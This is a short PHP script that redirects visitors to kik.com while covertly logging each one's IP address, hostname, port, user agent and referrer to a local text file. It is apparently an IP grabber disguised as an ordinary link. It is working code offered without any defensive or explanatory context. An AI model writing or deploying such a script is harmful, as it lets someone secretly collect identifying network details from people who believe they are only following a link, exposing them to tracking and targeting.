<?php
	header ('Location:http://kik.com/');

	$protocol = $_SERVER['SERVER_PROTOCOL'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$port = $_SERVER['REMOTE_PORT'];
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$ref = $_SERVER['HTTP_REFERER'];
	$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
	$fh = fopen('portlogger.txt', 'a');

	$data = 
	"IP Address : $ip\n" . 
	"Hostname: $hostname\n" . 
	"Port Number: $port\n" . 
	"User Agent: $agent\n" .
	"HTTP Referer: $ref\n\n";
	
	fwrite($fh, $data);
	fclose($fh);
?>
